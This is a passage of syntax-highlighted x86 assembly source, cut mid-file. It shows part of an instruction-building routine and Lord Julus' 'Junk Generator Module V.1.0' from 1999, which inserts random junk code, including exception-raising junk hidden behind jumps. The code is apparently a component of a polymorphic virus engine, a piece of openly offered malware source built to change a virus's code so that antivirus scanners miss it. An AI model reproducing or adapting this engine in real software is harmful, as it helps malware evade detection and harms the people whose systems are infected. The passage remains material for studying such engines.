      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">; and fill them up...</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">creg</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                            </span><span class="sc1">; align like this: xxNNNxxx</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01000000b</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">increment_flag</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">done_i08</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">not_ebp2</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">; and fill them up...</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">creg</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                            </span><span class="sc1">; align like this: xxNNNxxx</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">done_i08</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ok_procs</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">proc09</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; &lt;op4&gt; kreg, keyvalue</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">op4</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">un_op_code2</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11111000b</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kreg</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; fill kreg</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">keyvalue</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; fill key</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ok_procs</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">proc10</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; sub preg, 4</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11111000b</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">preg</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ok_procs</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">proc11</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; sub lreg, 1</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11111000b</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">lreg</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ok_procs</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">proc12</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; jnz mainloop</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mainlp</span><span class="sc4">]</span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">popad</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">special_ok_procs</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ok_procs</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">; done!</span><span class="sc0">
      </span><span class="sc6">popad</span><span class="sc0">                                </span><span class="sc1">; restore all regs</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">special_ok_procs</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">increment_flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; If we stored suplemental bytes</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_increment</span><span class="sc0">                     </span><span class="sc1">; we need to move edi forward.</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">increment_flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_increment</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">                                  </span><span class="sc1">; and return</span><span class="sc0">
</span><span class="sc5">makeinstr</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ</span><span class="sc0">

</span><span class="sc1">; ²±°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°</span><span class="sc0">
</span><span class="sc1">; ²±°</span><span class="sc0">
</span><span class="sc1">; ²±°  Lord Julus' Junk Generator Module V.1.0 (March 1999)                 ²</span><span class="sc0">
</span><span class="sc1">; ²±                                                                       ±²</span><span class="sc0">
</span><span class="sc1">; ²                                                                       °±²</span><span class="sc0">
</span><span class="sc1">;                                                                         °±²</span><span class="sc0">
</span><span class="sc1">; °°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°±²</span><span class="sc0">

</span><span class="sc5">makejunk</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">                              </span><span class="sc1">; This is the main junk</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">maxjunks</span><span class="sc0">                         </span><span class="sc1">; routine.</span><span class="sc0">
</span><span class="sc5">junk_loop</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_makejunk</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">junk_loop</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">makejunk</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">

      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"JGM - Junk Generator Module V.1.0 by Lord Julus - March 1999"</span><span class="sc0">

                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_makejunk</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">                             </span><span class="sc1">; Generate junk!</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                                </span><span class="sc1">; choose between safe junks</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                            </span><span class="sc1">; and junks that might</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                </span><span class="sc1">; generate exception errors</span><span class="sc0">
      </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">flawable_junk</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_sure_junk</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_junk</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">flawable_junk</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_flaw_junk</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">exit_junk</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">                                       </span><span class="sc1">; and return</span><span class="sc0">
</span><span class="sc5">_makejunk</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">make_flaw_junk</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">                        </span><span class="sc1">; Here we will generate</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                      </span><span class="sc1">; junks that could raise</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">max_junk_hunk</span><span class="sc0">                    </span><span class="sc1">; exception errors...</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">flawable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">; (mark the type)</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">                              </span><span class="sc1">; ...and so we generate a</span><span class="sc0">
      </span><span class="sc6">stosb</span><span class="sc0">                                     </span><span class="sc1">; Jump to skip them</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">address_save</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">               </span><span class="sc1">; save jump place</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">stosd</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">repeat_makejunk</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">output_one_junk</span><span class="sc0">                      </span><span class="sc1">; now we make the junks</span><span class="sc0">
      </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">repeat_makejunk</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">address_save</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; and create the jump</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                              </span><span class="sc1">; address</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">address_save</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">stosd</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">make_flaw_junk</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">make_sure_junk</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                      </span><span class="sc1">; junks that could raise</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">max_junk_hunk</span><span class="sc0">                    </span><span class="sc1">; exception errors...</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">flawable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                     </span><span class="sc1">; (mark type)</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">repeat_makejunk_2</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">output_one_junk</span><span class="sc0">                      </span><span class="sc1">; now we make the junks</span><span class="sc0">
      </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">repeat_makejunk_2</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
